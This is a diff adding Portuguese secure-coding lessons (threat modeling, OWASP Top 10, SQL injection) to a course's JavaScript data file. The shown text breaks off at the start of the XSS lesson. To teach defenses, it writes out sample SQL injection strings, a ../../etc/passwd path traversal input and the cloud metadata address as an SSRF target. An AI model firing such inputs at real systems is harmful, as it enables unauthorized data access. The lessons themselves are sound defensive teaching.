@@ -21741,33 +21741,2664 @@ export default area({
         "Threat modeling → OWASP Top 10 → ataques (SQLi/XSS/CSRF/SSRF/BAC) → input validation (canônico, segurança) → " +
         "output encoding → CSP → security headers → secrets → encryption → dependency vulnerabilities.",
       concepts: [
-        concept({ order: 10, title: "Threat Modeling", note: "STRIDE, superfície de ataque, trust boundaries; loose ref a fronteiras de módulo (Epic 04)" }),
-        concept({ order: 20, title: "OWASP Top 10", requires: ["Threat Modeling"], note: "framing do resto da Story" }),
-        concept({ order: 30, title: "SQL Injection", requires: ["Database Fundamentals / SQL"], note: "queries parametrizadas; ORM não é imunidade automática" }),
-        concept({ order: 40, title: "Cross-Site Scripting (XSS)", requires: ["Web Fundamentals / Same-Origin Policy"], note: "stored/reflected/DOM" }),
-        concept({ order: 50, title: "Cross-Site Request Forgery (CSRF)", requires: ["Web Fundamentals / Cookies"], note: "tokens anti-CSRF, SameSite" }),
-        concept({ order: 60, title: "Server-Side Request Forgery (SSRF)", note: "relevante em cloud (metadata endpoint) — liga com Cloud Security" }),
+        concept({
+          order: 10,
+          title: "Threat Modeling",
+          note: "STRIDE, superfície de ataque, trust boundaries; loose ref a fronteiras de módulo (Epic 04)",
+          summary:
+            "Pensar de forma estruturada, antes de construir, no que pode dar errado com a segurança de um sistema: o " +
+            "que ele protege, por onde pode ser atacado, que ameaças existem em cada fronteira de confiança e o que " +
+            "será feito a respeito de cada uma.",
+          content: [
+            { type: "heading", text: "Conceito" },
+            {
+              type: "paragraph",
+              text:
+                "Modelagem de ameaças é um exercício de projeto, feito em grupo e de preferência cedo, que responde a " +
+                "quatro perguntas: o que estamos construindo? O que pode dar errado? O que vamos fazer a respeito? " +
+                "Fizemos um bom trabalho? Desenha-se o sistema como um fluxo de dados — pessoas, processos, bancos, " +
+                "serviços externos — e marcam-se as fronteiras de confiança, onde os dados passam de um lugar menos " +
+                "confiável para um mais confiável (da internet para a API, da API para o banco). Em cada fronteira, uma " +
+                "lista como a STRIDE ajuda a não esquecer categorias: falsificação de identidade (Spoofing), adulteração " +
+                "(Tampering), repúdio (Repudiation), vazamento de informação (Information disclosure), negação de serviço " +
+                "(Denial of service) e elevação de privilégio (Elevation of privilege).",
+            },
+            {
+              type: "callout",
+              title: "Ideia principal",
+              text:
+                "Os ataques acontecem nas fronteiras de confiança: desenhe por onde os dados entram e mudam de dono, " +
+                "pergunte o que cada categoria da STRIDE faria ali, e transforme as respostas em decisões — mitigar, " +
+                "aceitar ou transferir — com responsável e prazo.",
+            },
+            { type: "heading", text: "Por que importa" },
+            {
+              type: "paragraph",
+              text:
+                "Encontrar uma falha no desenho custa uma conversa; encontrá-la em produção custa um incidente. A " +
+                "modelagem também dá foco: em vez de tentar proteger tudo igualmente, o time sabe quais são os ativos " +
+                "mais valiosos, onde estão as entradas mais expostas e quais ameaças merecem esforço agora. É o mesmo " +
+                "raciocínio das fronteiras entre módulos: o que entra por uma interface não deve ser confiado sem " +
+                "verificação.",
+            },
+            { type: "heading", text: "Na prática" },
+            {
+              type: "code",
+              language: "javascript",
+              filename: "threats.js",
+              code: [
+                "// Recurso: \"enviar foto de perfil\". Fronteiras: navegador → API → armazenamento de arquivos",
+                "const threats = [",
+                "  { stride: \"Spoofing\", where: \"API\", threat: \"enviar foto em nome de outra pessoa\", likelihood: 2, impact: 2,",
+                "    decision: \"mitigar\", action: \"o dono vem da sessão, nunca do corpo\" },",
+                "  { stride: \"Tampering\", where: \"armazenamento\", threat: \"arquivo HTML/SVG com script servido do nosso domínio\", likelihood: 3, impact: 3,",
+                "    decision: \"mitigar\", action: \"aceitar só JPEG/PNG pelo conteúdo; servir de outro domínio; Content-Type fixo\" },",
+                "  { stride: \"Information disclosure\", where: \"armazenamento\", threat: \"fotos privadas acessíveis por URL adivinhável\", likelihood: 2, impact: 2,",
+                "    decision: \"mitigar\", action: \"nomes aleatórios; URL assinada com validade\" },",
+                "  { stride: \"Denial of service\", where: \"API\", threat: \"arquivos enormes ou milhares de envios\", likelihood: 3, impact: 2,",
+                "    decision: \"mitigar\", action: \"limite de 5 MB e de envios por minuto\" },",
+                "  { stride: \"Repudiation\", where: \"API\", threat: \"\\\"não fui eu que troquei a foto\\\"\", likelihood: 1, impact: 1,",
+                "    decision: \"aceitar\", action: \"log de auditoria já existente basta\" },",
+                "];",
+                "",
+                "// Priorização simples: probabilidade × impacto (1 a 3 cada)",
+                "threats",
+                "  .map((t) => ({ ...t, risk: t.likelihood * t.impact }))",
+                "  .sort((a, b) => b.risk - a.risk)",
+                "  .map((t) => `${t.risk} ${t.stride}: ${t.threat} → ${t.decision}`);",
+                "// [\"9 Tampering: arquivo HTML/SVG com script servido do nosso domínio → mitigar\", \"6 Denial of service: ...\", ...]",
+              ].join("\n"),
+            },
+            { type: "heading", text: "Armadilhas" },
+            {
+              type: "list",
+              items: [
+                "Fazer a modelagem uma vez, no início do projeto, e nunca mais: cada recurso novo que cria uma entrada ou uma fronteira merece a sua rodada, curta.",
+                "Terminar com uma lista de ameaças sem decisão nem responsável: o valor está nas ações que saem dela.",
+                "Pensar só em atacantes externos: pessoas de dentro, integrações de terceiros e dependências comprometidas também atravessam fronteiras.",
+                "Transformar o exercício num documento enorme que ninguém lê; um diagrama simples e uma tabela curta de ameaças priorizadas costumam bastar.",
+              ],
+            },
+          ],
+          examples: [
+            {
+              title: "O diagrama de fluxo com as fronteiras",
+              context: "O desenho mínimo que sustenta a conversa.",
+              code: {
+                language: "text",
+                filename: "dfd.txt",
+                code: [
+                  " [Navegador] ──HTTPS──▶ ┆ [API de perfil] ──▶ ┆ [Armazenamento de arquivos]",
+                  "    pessoa              ┆    processo          ┆    dados",
+                  "                        ┆       │              ┆",
+                  "                        ┆       ▼              ┆",
+                  "                        ┆  [Banco de usuários] ┆",
+                  " internet               ┆ rede da aplicação    ┆ serviço gerenciado (nuvem)",
+                  " (não confiável)        ┆                      ┆",
+                  "",
+                  " ┆ = fronteira de confiança: tudo o que a atravessa precisa ser verificado",
+                  "   (autenticação, validação, autorização, criptografia)",
+                ].join("\n"),
+              },
+              explanation:
+                "Cada fronteira é uma pergunta: quem pode enviar dados por aqui, e o que acontece se eles forem " +
+                "maliciosos? O desenho não precisa ser bonito; precisa mostrar por onde os dados entram, onde ficam " +
+                "guardados e quem confia em quem.",
+            },
+            {
+              title: "STRIDE: uma pergunta por letra",
+              context: "Cada categoria corresponde a uma propriedade de segurança que pode ser violada.",
+              code: {
+                language: "text",
+                filename: "stride.txt",
+                code: [
+                  "Ameaça                    Propriedade violada   Pergunta na fronteira                      Defesas típicas",
+                  "Spoofing                  autenticidade         alguém pode se passar por outro?           autenticação forte, MFA",
+                  "Tampering                 integridade           dá para alterar dados no caminho/guardados? assinatura, TLS, validação",
+                  "Repudiation               não repúdio           alguém pode negar o que fez?               logs de auditoria assinados",
+                  "Information disclosure    confidencialidade     o que vaza se isto for lido?               autorização, criptografia",
+                  "Denial of service         disponibilidade       dá para derrubar ou esgotar isto?          limites, cotas, timeouts",
+                  "Elevation of privilege    autorização           dá para ganhar mais acesso do que tem?     menor privilégio, checagens no servidor",
+                ].join("\n"),
+              },
+              explanation:
+                "A STRIDE não é uma lista de ataques, e sim um roteiro para não esquecer categorias inteiras. Percorrê-la " +
+                "em cada fronteira transforma \"o que pode dar errado?\" numa sequência de perguntas concretas.",
+            },
+            {
+              title: "Uma rodada curta, dentro do fluxo do time",
+              context: "A modelagem funciona melhor como hábito leve do que como evento raro.",
+              code: {
+                language: "text",
+                filename: "lightweight.txt",
+                code: [
+                  "Quando: no refinamento de toda história que cria uma entrada nova, muda quem acessa",
+                  "        um dado sensível ou integra um serviço externo.",
+                  "Quem:   quem vai implementar + alguém de fora da história (olhar novo).",
+                  "Tempo:  30 minutos.",
+                  "Saída:  na própria história, uma seção \"Ameaças\":",
+                  "          - arquivo com script servido do nosso domínio → validar conteúdo, servir de outro domínio (Ana)",
+                  "          - envio em massa → limite por minuto (Bruno)",
+                  "          - aceitamos: sem antivírus nos arquivos por enquanto (revisar em março)",
+                ].join("\n"),
+              },
+              explanation:
+                "Uma rodada curta, amarrada à história que muda a superfície de ataque, mantém a modelagem atualizada sem " +
+                "virar burocracia. Registrar também o que foi aceito, com prazo de revisão, é o que diferencia um risco " +
+                "assumido de um risco esquecido.",
+            },
+          ],
+          exercise: {
+            problem:
+              "O time vai lançar um recurso de webhooks: o cliente cadastra uma URL, e o sistema faz um POST para ela a " +
+              "cada pedido novo, com os dados do pedido. Ninguém fez a modelagem de ameaças.",
+            problemCode: {
+              language: "javascript",
+              filename: "webhooks.js",
+              code: [
+                "// Fluxo planejado:",
+                "// 1. o cliente cadastra { url } no painel",
+                "// 2. a cada pedido novo, o servidor faz POST para a url com { orderId, total, customerEmail }",
+                "// 3. se a url falhar, tenta de novo até 10 vezes",
+                "",
+                "const threats = [];   // preencha: { stride, threat, decision, action }",
+              ].join("\n"),
+            },
+            task:
+              "Liste pelo menos cinco ameaças, cobrindo categorias diferentes da STRIDE, com a decisão e a ação de cada " +
+              "uma.",
+            hint:
+              "Pense em para onde o servidor pode ser levado a fazer requisições, em quem pode fingir ser o seu " +
+              "servidor para o cliente, no que vai dentro do POST e no que acontece se a URL do cliente ficar lenta.",
+            solution: {
+              code: {
+                language: "javascript",
+                filename: "webhooks.answer.js",
+                code: [
+                  "const threats = [",
+                  "  { stride: \"Elevation of privilege\", threat: \"URL apontando para a rede interna ou para o endpoint de metadados da nuvem (SSRF)\",",
+                  "    decision: \"mitigar\", action: \"só https, resolver o DNS e bloquear IPs privados, de loopback e link-local; não seguir redirecionamentos\" },",
+                  "  { stride: \"Spoofing\", threat: \"um terceiro envia POSTs falsos à URL do cliente fingindo ser o nosso servidor\",",
+                  "    decision: \"mitigar\", action: \"assinar cada entrega com HMAC e um segredo por cliente, com carimbo de tempo\" },",
+                  "  { stride: \"Information disclosure\", threat: \"o e-mail do cliente final enviado a uma URL de terceiros sem necessidade\",",
+                  "    decision: \"mitigar\", action: \"enviar só ids; o cliente consulta os detalhes pela API autenticada\" },",
+                  "  { stride: \"Denial of service\", threat: \"URLs lentas prendendo os workers de envio\",",
+                  "    decision: \"mitigar\", action: \"timeout de 5 s, fila separada, desligar o webhook depois de falhas seguidas\" },",
+                  "  { stride: \"Tampering\", threat: \"alterar a URL de outro cliente pelo painel\",",
+                  "    decision: \"mitigar\", action: \"a URL pertence à organização da sessão; mudança exige permissão e fica no log\" },",
+                  "  { stride: \"Repudiation\", threat: \"cliente diz que não recebeu a entrega\",",
+                  "    decision: \"mitigar\", action: \"registrar cada tentativa com status e horário, visível no painel\" },",
+                  "];",
+                ].join("\n"),
+              },
+              explanation:
+                "A ameaça mais grave é a primeira: um recurso que faz o servidor buscar URLs escolhidas por clientes é a " +
+                "porta de entrada clássica para SSRF. A modelagem, feita antes, transforma cada ameaça numa tarefa da " +
+                "própria história, em vez de um incidente depois do lançamento.",
+            },
+          },
+        }),
+        concept({
+          order: 20,
+          title: "OWASP Top 10",
+          requires: ["Threat Modeling"],
+          note: "framing do resto da Story",
+          summary:
+            "A lista, publicada pela fundação OWASP, das categorias de risco mais importantes em aplicações web, " +
+            "montada a partir de dados de falhas reais — um vocabulário comum e um ponto de partida para priorizar a " +
+            "segurança, e não uma lista completa.",
+          content: [
+            { type: "heading", text: "Conceito" },
+            {
+              type: "paragraph",
+              text:
+                "A OWASP (Open Worldwide Application Security Project) é uma fundação sem fins lucrativos que mantém " +
+                "material aberto sobre segurança de software. O seu Top 10 agrupa as falhas mais frequentes e graves em " +
+                "dez categorias, revisadas periodicamente com dados de testes e de incidentes. Na edição de 2021, a " +
+                "primeira categoria é o controle de acesso quebrado, seguida de falhas criptográficas e de injeção. Uma " +
+                "edição de 2025 reorganizou as categorias; vale consultar a versão atual em owasp.org. Mais do que " +
+                "decorar a ordem, o Top 10 serve como vocabulário comum entre desenvolvimento, segurança e auditoria, e " +
+                "como roteiro mínimo de revisão.",
+            },
+            {
+              type: "callout",
+              title: "Ideia principal",
+              text:
+                "O Top 10 é o mínimo, e não o máximo: ele ajuda a não esquecer as falhas mais comuns e dá nome a elas, " +
+                "mas uma aplicação livre dessas dez categorias ainda pode ter problemas específicos do seu domínio.",
+            },
+            { type: "heading", text: "Por que importa" },
+            {
+              type: "paragraph",
+              text:
+                "Quase todos os incidentes em aplicações web caem em poucas categorias que se repetem há anos: acesso a " +
+                "dados de outros usuários, injeção, credenciais fracas, configuração insegura, dependências " +
+                "desatualizadas. Conhecer as categorias e as defesas de cada uma — tema dos próximos conceitos deste " +
+                "módulo — cobre a maior parte do risco com um esforço razoável.",
+            },
+            { type: "heading", text: "Na prática" },
+            {
+              type: "code",
+              language: "text",
+              filename: "owasp-top10-2021.txt",
+              code: [
+                "OWASP Top 10 — edição 2021",
+                "",
+                "A01 Broken Access Control              acessar dados ou funções de outros (IDOR, rotas sem checagem)",
+                "A02 Cryptographic Failures             dados sensíveis sem criptografia, algoritmos fracos, chaves mal guardadas",
+                "A03 Injection                          SQL, comandos do sistema, XSS (dado tratado como código)",
+                "A04 Insecure Design                    falhas no desenho, que nenhum ajuste de implementação corrige",
+                "A05 Security Misconfiguration          padrões inseguros, painéis expostos, cabeçalhos ausentes, erros detalhados",
+                "A06 Vulnerable and Outdated Components dependências com vulnerabilidades conhecidas",
+                "A07 Identification and Authentication  senhas fracas, sessões mal geridas, falta de MFA",
+                "    Failures",
+                "A08 Software and Data Integrity        atualizações e pipelines sem verificação de integridade",
+                "    Failures",
+                "A09 Security Logging and Monitoring    ataques que acontecem sem ninguém ver",
+                "    Failures",
+                "A10 Server-Side Request Forgery        o servidor levado a fazer requisições para onde não devia",
+                "",
+                "(A edição 2025 reorganiza a lista; consulte owasp.org/Top10 para a versão vigente.)",
+              ].join("\n"),
+            },
+            {
+              type: "code",
+              language: "javascript",
+              filename: "review-checklist.js",
+              code: [
+                "// Um roteiro de revisão por categoria, aplicado a cada rota nova",
+                "const checklist = {",
+                "  A01: [\"o recurso é filtrado pelo dono/tenant?\", \"a rota declara a permissão exigida?\"],",
+                "  A03: [\"toda consulta usa parâmetros?\", \"toda saída em HTML é codificada pelo contexto?\"],",
+                "  A05: [\"erros não expõem stack trace ao cliente?\", \"cabeçalhos de segurança presentes?\"],",
+                "  A07: [\"a rota exige autenticação?\", \"ações sensíveis pedem login recente?\"],",
+                "  A10: [\"a rota busca alguma URL informada pelo cliente?\"],",
+                "};",
+                "",
+                "const pending = (answers) =>",
+                "  Object.entries(checklist).flatMap(([id, questions]) => questions.filter((q) => answers[q] !== true).map((q) => `${id}: ${q}`));",
+                "",
+                "pending({ \"o recurso é filtrado pelo dono/tenant?\": true, \"toda consulta usa parâmetros?\": true }).length;   // 7 itens ainda sem resposta",
+              ].join("\n"),
+            },
+            { type: "heading", text: "Armadilhas" },
+            {
+              type: "list",
+              items: [
+                "Tratar o Top 10 como checklist de conformidade (\"passamos no Top 10\"): ele é uma lista de categorias amplas, e cada uma exige entender o seu sistema.",
+                "Ignorar o que não está na lista: falhas de lógica de negócio, como aplicar um cupom duas vezes, raramente aparecem nele e podem custar caro.",
+                "Estudar os ataques sem mudar o processo: as categorias se repetem porque faltam revisões, testes e padrões seguros por omissão no código.",
+                "Confiar só em ferramentas automáticas: elas encontram bem injeções e dependências vulneráveis, e mal os problemas de controle de acesso e de desenho.",
+              ],
+            },
+          ],
+          examples: [
+            {
+              title: "Uma categoria, várias falhas",
+              context: "Cada item do Top 10 agrupa muitos problemas concretos.",
+              code: {
+                language: "text",
+                filename: "a01-examples.txt",
+                code: [
+                  "A01 Broken Access Control inclui, entre outros:",
+                  "  - trocar o id na URL e ver o pedido de outra pessoa (IDOR)",
+                  "  - acessar /admin sem ser administrador, porque só o menu estava escondido",
+                  "  - enviar \"role\": \"admin\" no corpo do cadastro e ser aceito (mass assignment)",
+                  "  - ler ../../etc/passwd por um parâmetro de nome de arquivo (path traversal)",
+                  "  - CORS liberando qualquer origem com credenciais",
+                  "",
+                  "Cada uma tem causa e correção diferentes — e todas são \"controle de acesso quebrado\".",
+                ].join("\n"),
+              },
+              explanation:
+                "O nome da categoria diz o tipo de propriedade violada, e não o bug específico. Por isso o Top 10 " +
+                "funciona como mapa: ele aponta onde procurar, e o conhecimento de cada falha concreta vem dos conceitos " +
+                "seguintes.",
+            },
+            {
+              title: "Design inseguro não se corrige com código",
+              context: "A04 trata de falhas que estão na regra, e não na implementação.",
+              code: {
+                language: "text",
+                filename: "insecure-design.txt",
+                code: [
+                  "Regra de negócio: \"o código de recuperação de senha tem 4 dígitos e vale por 24 horas\".",
+                  "",
+                  "A implementação pode ser impecável — sem injeção, com HTTPS, com logs — e ainda assim:",
+                  "  10.000 combinações possíveis, 24 horas para tentar, sem limite de tentativas",
+                  "  → qualquer conta pode ser tomada por força bruta.",
+                  "",
+                  "A correção muda o desenho: token aleatório longo, validade de minutos, uso único,",
+                  "limite de tentativas por conta e por IP.",
+                ].join("\n"),
+              },
+              explanation:
+                "Revisões de código e scanners procuram implementações erradas; aqui a implementação está certa, e a " +
+                "regra é que é fraca. É o tipo de problema que a modelagem de ameaças encontra antes de o código existir.",
+            },
+            {
+              title: "O que a ferramenta encontra, e o que não encontra",
+              context: "Scanners automáticos cobrem bem algumas categorias e mal outras.",
+              code: {
+                language: "text",
+                filename: "tool-coverage.txt",
+                code: [
+                  "                                    SAST (código)   DAST (app rodando)   SCA (dependências)   revisão humana",
+                  "A01 Broken Access Control           pouco           pouco                —                    bem",
+                  "A03 Injection                       bem             bem                  —                    bem",
+                  "A04 Insecure Design                 —               —                    —                    bem",
+                  "A05 Security Misconfiguration       às vezes        bem                  —                    bem",
+                  "A06 Vulnerable Components           —               —                    bem                  —",
+                  "",
+                  "Controle de acesso depende de saber o que cada pessoa DEVERIA poder fazer —",
+                  "informação que a ferramenta não tem.",
+                ].join("\n"),
+              },
+              explanation:
+                "As categorias mais comuns no topo da lista, como controle de acesso e desenho inseguro, são justamente " +
+                "as que ferramentas encontram pior. Testes automatizados de autorização escritos pelo próprio time e " +
+                "revisão de código cobrem essa lacuna.",
+            },
+          ],
+          exercise: {
+            problem:
+              "Um relatório de pentest listou cinco achados numa API. O time quer classificá-los pelas categorias do " +
+              "Top 10 (edição 2021) para agrupar as correções e medir a evolução nos próximos testes.",
+            problemCode: {
+              language: "javascript",
+              filename: "findings.js",
+              code: [
+                "const findings = [",
+                "  { id: 1, text: \"Mensagens de erro devolvem o stack trace completo com o caminho dos arquivos do servidor.\" },",
+                "  { id: 2, text: \"GET /api/orders/{id} devolve pedidos de outros clientes.\" },",
+                "  { id: 3, text: \"A biblioteca de parsing de XML está numa versão com vulnerabilidade crítica publicada.\" },",
+                "  { id: 4, text: \"O campo de busca é concatenado numa consulta SQL.\" },",
+                "  { id: 5, text: \"A funcionalidade de pré-visualizar links busca qualquer URL, inclusive http://169.254.169.254/.\" },",
+                "];",
+              ].join("\n"),
+            },
+            task: "Associe cada achado a uma categoria e escreva, em uma frase, a correção principal.",
+            hint:
+              "Mensagem de erro detalhada é configuração; dados de outros clientes é acesso; versão vulnerável é " +
+              "componente; consulta concatenada é injeção; buscar URL arbitrária é SSRF.",
+            solution: {
+              code: {
+                language: "javascript",
+                filename: "findings.answer.js",
+                code: [
+                  "const classified = [",
+                  "  { id: 1, category: \"A05 Security Misconfiguration\", fix: \"erro genérico para o cliente; detalhes só no log interno\" },",
+                  "  { id: 2, category: \"A01 Broken Access Control\", fix: \"filtrar o pedido pelo cliente da sessão na própria consulta\" },",
+                  "  { id: 3, category: \"A06 Vulnerable and Outdated Components\", fix: \"atualizar a biblioteca e automatizar a auditoria de dependências\" },",
+                  "  { id: 4, category: \"A03 Injection\", fix: \"consulta parametrizada; o termo de busca vai como parâmetro\" },",
+                  "  { id: 5, category: \"A10 Server-Side Request Forgery\", fix: \"permitir só https público: resolver o DNS e bloquear IPs internos e link-local\" },",
+                  "];",
+                ].join("\n"),
+              },
+              explanation:
+                "Classificar pelo Top 10 agrupa correções parecidas e permite acompanhar se uma categoria volta a " +
+                "aparecer. O achado 5 é o mais perigoso em nuvem: o endereço 169.254.169.254 é o serviço de metadados, " +
+                "que pode entregar credenciais da máquina.",
+            },
+          },
+        }),
+        concept({
+          order: 30,
+          title: "SQL Injection",
+          requires: ["Database Fundamentals / SQL"],
+          note: "queries parametrizadas; ORM não é imunidade automática",
+          summary:
+            "Uma falha em que um valor vindo de fora é concatenado no texto de um comando SQL e passa a ser " +
+            "interpretado como parte do comando — permitindo ler, alterar ou apagar dados — e que se evita mandando " +
+            "os valores sempre como parâmetros, separados do comando.",
+          content: [
+            { type: "heading", text: "Conceito" },
+            {
+              type: "paragraph",
+              text:
+                "Há injeção de SQL quando o texto do comando é montado com dados que o atacante controla. O banco não tem " +
+                "como saber qual parte do texto era para ser um valor e qual era comando, e um valor com aspas e " +
+                "palavras-chave muda o significado da consulta. A defesa principal é a consulta parametrizada: o comando " +
+                "é enviado com marcadores (`?` ou `$1`) e os valores vão separados, de modo que o banco nunca os " +
+                "interpreta como SQL. ORMs e query builders parametrizam por padrão, mas todos oferecem formas de " +
+                "escrever SQL cru, e é nelas que a injeção volta.",
+            },
+            {
+              type: "callout",
+              title: "Ideia principal",
+              text:
+                "O comando é escrito pelo programa, e os valores vêm só como parâmetros: nenhum dado de fora entra no " +
+                "texto do SQL — e o que não pode ser parâmetro, como o nome de uma coluna, sai de uma lista fechada.",
+            },
+            { type: "heading", text: "Como funciona" },
+            {
+              type: "code",
+              language: "javascript",
+              filename: "sqli.js",
+              code: [
+                "import { DatabaseSync } from \"node:sqlite\";",
+                "const db = new DatabaseSync(\":memory:\");",
+                "db.exec(`",
+                "  CREATE TABLE users (id INTEGER PRIMARY KEY, email TEXT, is_admin INTEGER);",
+                "  INSERT INTO users (email, is_admin) VALUES ('ana@example.test', 0), ('root@example.test', 1);",
+                "`);",
+                "",
+                "// Vulnerável: o valor vira parte do comando",
+                "const findWrong = (email) => db.prepare(`SELECT id, email FROM users WHERE email = '${email}'`).all();",
+                "",
+                "findWrong(\"ana@example.test\").length;   // 1",
+                "findWrong(\"x' OR '1'='1\").length;       // 2 — a condição virou sempre verdadeira: todos os usuários",
+                "",
+                "// Parametrizado: o valor nunca é interpretado como SQL",
+                "const find = (email) => db.prepare(\"SELECT id, email FROM users WHERE email = ?\").all(email);",
+                "find(\"x' OR '1'='1\").length;            // 0 — procura literalmente por esse e-mail",
+              ].join("\n"),
+            },
+            {
+              type: "paragraph",
+              text:
+                "A consulta parametrizada não \"limpa\" o valor: ela o envia por um canal separado. Por isso funciona para " +
+                "qualquer conteúdo, inclusive nomes com apóstrofo, como O'Brien, que a concatenação também quebraria.",
+            },
+            { type: "heading", text: "Quando usar" },
+            {
+              type: "list",
+              items: [
+                "Parâmetros em toda consulta que recebe um valor vindo de fora, sem exceção — inclusive dados que vêm do próprio banco (injeção de segunda ordem).",
+                "A forma segura de SQL cru do seu ORM (template marcado, como `sql`...``), nunca a variante \"unsafe\" com interpolação.",
+                "Lista fechada (allowlist) para o que não pode ser parâmetro: nomes de colunas, direção de ordenação, nomes de tabelas.",
+              ],
+            },
+            { type: "heading", text: "Quando não usar / Limitações" },
+            {
+              type: "list",
+              items: [
+                "Escapar aspas à mão não é uma defesa confiável: depende do banco, da codificação e de nunca esquecer um lugar.",
+                "Parâmetros não protegem SQL gerado dinamicamente dentro do banco (procedures que montam e executam texto); ali também é preciso parametrizar.",
+                "A parametrização não substitui o menor privilégio: o usuário do banco usado pela aplicação não deve poder apagar tabelas nem ler o que não precisa.",
+              ],
+            },
+          ],
+          examples: [
+            {
+              title: "O ORM e a porta dos fundos do SQL cru",
+              context: "Os ORMs parametrizam, até alguém escrever SQL à mão com interpolação.",
+              code: {
+                language: "javascript",
+                filename: "orm-raw.js",
+                code: [
+                  "// Prisma: o template marcado vira consulta parametrizada",
+                  "const safe = await prisma.$queryRaw`SELECT id, name FROM \"Product\" WHERE name ILIKE ${\"%\" + term + \"%\"}`;",
+                  "",
+                  "// A variante \"Unsafe\" aceita uma string pronta: a interpolação volta a ser injeção",
+                  "const unsafe = await prisma.$queryRawUnsafe(`SELECT id, name FROM \"Product\" WHERE name ILIKE '%${term}%'`);",
+                  "",
+                  "// knex: o mesmo padrão",
+                  "await knex.raw(\"SELECT * FROM products WHERE category = ?\", [category]);   // seguro",
+                  "await knex.raw(`SELECT * FROM products WHERE category = '${category}'`);   // injeção",
+                ].join("\n"),
+              },
+              explanation:
+                "O ORM não protege o que o próprio código monta como texto. Em revisão de código, qualquer SQL cru com " +
+                "`${...}` dentro de uma string comum (e não de um template marcado) merece atenção imediata.",
+            },
+            {
+              title: "Uma lista de ids, com um parâmetro por item",
+              context: "`IN (...)` com a lista concatenada é um lugar comum de injeção.",
+              code: {
+                language: "javascript",
+                filename: "in-list.js",
+                code: [
+                  "// (usa o banco do exemplo anterior)",
+                  "const ids = [1, 2];",
+                  "",
+                  "// Vulnerável: a lista vira texto — e ninguém garantiu que eram números",
+                  "const wrong = (list) => db.prepare(`SELECT email FROM users WHERE id IN (${list.join(\", \")})`).all();",
+                  "",
+                  "// Seguro: um marcador por item, e os valores como parâmetros",
+                  "function byIds(list) {",
+                  "  if (!list.length) return [];",
+                  "  const placeholders = list.map(() => \"?\").join(\", \");",
+                  "  return db.prepare(`SELECT email FROM users WHERE id IN (${placeholders})`).all(...list);",
+                  "}",
+                  "",
+                  "byIds(ids).length;                    // 2",
+                  "byIds([\"1) OR (1=1\"]).length;         // 0 — tratado como um valor, que não corresponde a nenhum id",
+                ].join("\n"),
+              },
+              explanation:
+                "O texto do comando pode ser montado dinamicamente, desde que só com partes escritas pelo programa, como " +
+                "os `?`. Os valores continuam indo separados, qualquer que seja a quantidade.",
+            },
+            {
+              title: "Injeção de segunda ordem",
+              context: "Um valor gravado com segurança é usado depois, sem parâmetro, em outra consulta.",
+              code: {
+                language: "javascript",
+                filename: "second-order.js",
+                code: [
+                  "// 1. O cadastro é seguro: o nome é gravado com parâmetro",
+                  "db.prepare(\"INSERT INTO users (email, is_admin) VALUES (?, 0)\").run(\"bob'--@example.test\");",
+                  "",
+                  "// 2. Meses depois, um relatório confia em dados \"do nosso banco\" e concatena",
+                  "const reportWrong = (user) => `SELECT count(*) FROM orders WHERE customer_email = '${user.email}' AND status = 'paid'`;",
+                  "reportWrong({ email: \"bob'--@example.test\" });",
+                  "// \"... WHERE customer_email = 'bob'--@example.test' AND status = 'paid'\" — o resto virou comentário",
+                ].join("\n"),
+              },
+              explanation:
+                "O valor entrou de forma segura e mesmo assim causou injeção, porque a segunda consulta tratou dados do " +
+                "próprio banco como confiáveis. A regra não é \"parametrizar o que vem do usuário\", e sim \"parametrizar " +
+                "todo valor\".",
+            },
+          ],
+          exercise: {
+            problem:
+              "A busca de produtos filtra por categoria e por um termo e ordena por uma coluna escolhida pelo usuário. " +
+              "Tudo é montado por concatenação.",
+            problemCode: {
+              language: "javascript",
+              filename: "search.js",
+              code: [
+                "import { DatabaseSync } from \"node:sqlite\";",
+                "const db = new DatabaseSync(\":memory:\");",
+                "db.exec(`",
+                "  CREATE TABLE products (id INTEGER PRIMARY KEY, name TEXT, category TEXT, price_cents INTEGER, cost_cents INTEGER);",
+                "  INSERT INTO products (name, category, price_cents, cost_cents) VALUES",
+                "    ('Caneca', 'cozinha', 3500, 1200), ('Copo', 'cozinha', 1900, 600), ('Mochila', 'viagem', 25000, 9000);",
+                "`);",
+                "",
+                "function search({ category, term, sort }) {",
+                "  return db.prepare(",
+                "    `SELECT id, name, price_cents FROM products WHERE category = '${category}' AND name LIKE '%${term}%' ORDER BY ${sort}`",
+                "  ).all();",
+                "}",
+              ].join("\n"),
+            },
+            task:
+              "Reescreva `search` com parâmetros para a categoria e o termo, e com uma lista fechada para a ordenação. " +
+              "Mostre que as entradas maliciosas deixam de funcionar.",
+            hint:
+              "O `%` do `LIKE` pode ir no próprio parâmetro. Para `sort`, mapeie as opções aceitas (`\"price\"`, " +
+              "`\"name\"`) para colunas reais, com um padrão quando a opção for desconhecida.",
+            solution: {
+              code: {
+                language: "javascript",
+                filename: "search.fixed.js",
+                code: [
+                  "const SORTS = { name: \"name ASC\", price: \"price_cents ASC\", \"-price\": \"price_cents DESC\" };",
+                  "",
+                  "function search({ category, term = \"\", sort }) {",
+                  "  const orderBy = SORTS[sort] ?? SORTS.name;   // só texto escrito pelo programa entra no comando",
+                  "  return db",
+                  "    .prepare(`SELECT id, name, price_cents FROM products WHERE category = ? AND name LIKE ? ORDER BY ${orderBy}`)",
+                  "    .all(category, `%${term}%`);",
+                  "}",
+                  "",
+                  "search({ category: \"cozinha\", term: \"\", sort: \"-price\" }).map((p) => p.name);   // [\"Caneca\", \"Copo\"]",
+                  "search({ category: \"x' OR '1'='1\", term: \"\", sort: \"name\" }).length;           // 0",
+                  "search({ category: \"cozinha\", term: \"\", sort: \"cost_cents DESC\" }).map((p) => p.name);",
+                  "// [\"Caneca\", \"Copo\"] — ordenação desconhecida cai no padrão, e a coluna de custo não é exposta",
+                ].join("\n"),
+              },
+              explanation:
+                "Categoria e termo passaram a parâmetros, e o `ORDER BY`, que não aceita parâmetro, passou a ser " +
+                "escolhido de um mapa fechado. Além de impedir a injeção, o mapa impede que o usuário ordene por colunas " +
+                "internas, como o custo, e descubra algo sobre elas pela ordem dos resultados.",
+            },
+          },
+        }),
+        concept({
+          order: 40,
+          title: "Cross-Site Scripting (XSS)",
+          requires: ["Web Fundamentals / Same-Origin Policy"],
+          note: "stored/reflected/DOM",
+          summary:
+            "Uma falha em que dados controlados por um atacante chegam à página como código — HTML ou JavaScript — e " +
+            "são executados no navegador de outras pessoas, com todos os poderes do site: ler a página, agir em nome " +
+            "da vítima e roubar o que não estiver protegido.",
